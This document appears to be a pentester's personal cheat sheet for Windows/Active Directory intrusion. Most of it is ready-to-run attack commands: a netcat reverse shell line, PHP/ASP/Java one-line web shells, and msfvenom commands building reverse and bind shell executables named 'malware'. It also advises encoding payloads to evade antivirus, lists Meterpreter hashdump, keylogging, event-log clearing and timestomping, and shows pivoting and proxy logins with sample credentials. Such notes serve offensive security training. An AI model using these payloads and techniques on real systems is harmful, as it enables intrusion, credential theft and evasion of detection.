SMB - 445
Kerberos - 88
RDP - 3389
LDAP - 389 636

Tools
Mimikatz - credential dumping
winPeas - local privesc
Bloodhound - collect AD data and find attack paths
PowerSploit - ps1 scripts


Exploit Databases
exploit-db.com
cve.mitre.org
securityfocus.com
Google Dork: "CVE-20XX-XXXX" site:github.com

Reverse Shell Generator
revshells.com

SearchSplot
       searchsploit <query>         
       searchspoit -m <exploit_id>
  
Fix Kali Issues
       github.com/Dewalt-arch/pimpmykali
  

Metasploit - exploitation framework. Has everything.
  msfconsole
  setg - set global variables
  unsetg
  search
  info
  use
  set RHOSTS <IP? - sets local variables
  unset
  sessions - lists active sessions
  session -i <session id> - connects to a session
  sessopn -u 1 - upgrade a session
  sessions -c cmd - execute comands in all sessions
  sessions -i 10-20 -c <session id> - execute commands in specific sessions
  
MetaSploit listener
  use multi/handler    : metasploit listener
  set LHOST
  run   -starts the listener
  
Python Listeners
  Python 2 simple web server
    python -m SimpleHTTPServer 8080
  Python 3 simple web server
    python -m http.server 1338
  
TCPdump
  tcpdump -t eth0 icmp  :listen for pings on specific interface
  tcpdump -i any icmp    :listen for pings on every interface
  
  
Listeners
  nc -lvnp <port>  : listens for connections on a port
        -l  start listener
        -v  run verbose
        -n  no DNS resolution
        -p  port
  nc <ip> <port> -e /bin/sh

Webshells
github.com/BlackArch/webshells
<?php echo system($_GET['cmd']);?>   : PHP one liner web shell  
<% eval request("cmd")%>  : ASP one liner web shell
<% Runtime.getRuntime().exec(request.getParameter("cmd"));%>  : java web shell
                  
                  
       
msfvenom
       msfvenom -l payloads   : lists available paylaods
       msfvenom -l encoders   : lists available encodings
       msfvenom -p (payload) -e (encoder) -f (filer_format) LHOST=<LISTERNER_IP> LPORT=<LISTENER_PORT>
       
       payload obsufucation is important to bypass anti virus
       msfvenom -e x86/shikata_ga_nai...
       virustotal.com to check malware hash
       
       Basic Reverse Shells
       Windows
       msfvenom -p windows/x64/shell/shell_reverse_tcp LHOST=<IP> LPORT=<IP> -f exe -o malware.exe
       Linux
       msfvenom -p linux/x64/shell/shell_reverse_tcp  LHOST=<IP> LPORT=<IP> -f elf -o malware.elf
       
       Basic Bind Shells
       Windows
       msfvenom -p windows/x64/shell/bind_tcp LHOST=<IP> RPORT=<IP> -f exe -o malware.exe
       Linux
       msfvenom -p linux/x64/shell/bind_tcp  LHOST=<IP> RPORT=<IP> -f elf -o malware.elf
       
       msfvenom -p php/reverse_php LHOST=<IP> LPORT=1337 -o malware.php
       msfvenom -p windws/x64/shell_reverse_tcp LHOST=<IP> LPORT=1337 -f msi -o malware.msi
      
                  
Meterpreter
       post exploitation tool for MetaSploit
       cat
       edit
       cd/ls
       pwd
       upload
       download
       
       sysinfo
       getuid
       
       Windows specific
              getsystem
              hashdump
                  
       
Meterpreter Terrorism
      clearev  : clear event logs
      timestomp  : time stamp tampering
      migrate 1337  : move to a nw process
      keyscan_start  : start keylogger
      keyscan_stop
      keyscan_dump  : dump logged keys
      screenshot
                  

       
       
       
       
Networking
       
       Address Resolution Protocol
       arp -a
       ip neigh show
       
       route print  - routing table
       route
       
       
       Conenctions and ports
       netstat -ano
       ss - peanut
       
       msf6
       run post/multi/manage/autorout
       cmd=add subnet=192.168.16.0 netmask=/24
       run post/multi/manage/autoroute cmd=print
       
       Port Scan in metasploit
       user auxiliary/scanner/portscan/tcp
       set RHOTS 192.168.16.5
       set ports 1-1000
       run
       
       Reverse Port Forwarding on Meterpreter
       portfwd add -R -p 1234 -l 443 -L 192.168.3.28
                     -R is reverse
                     -p is remotre port
                     -l is local port
                     -L is Listening host
                     192.168.3.28:443 <-> 0.0.0.0:1234
       
       Getting a Shell on Internal host
       msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.16.3 LPORT=1234 -f exe -o malware.exe
              LHOST and LPORT need to be set to compromised internal host when doing lateral movement. Just think, it makes sense.
       
       
       Proxying n Metasploit
       configure SOCKS proxy server
       use auxiliary/server/socks_proxy
       set srvport 9050
       set version 4a
       exploit -j
       
              Proxy allows us to communicate with the internal host from our native terminal
       
       Proxychains
       used to run commands through a proxy
       $ proxychains evil-winrm -u Administrator -p 'Oasswird123!' -i 192.168.16.5   (assumes credentials already got)
       $ proxychains xfreerdp /u:Administrator /p:'Password123!' /v:192.168.16.5 /d.mayorsec
       
       
                  
                  
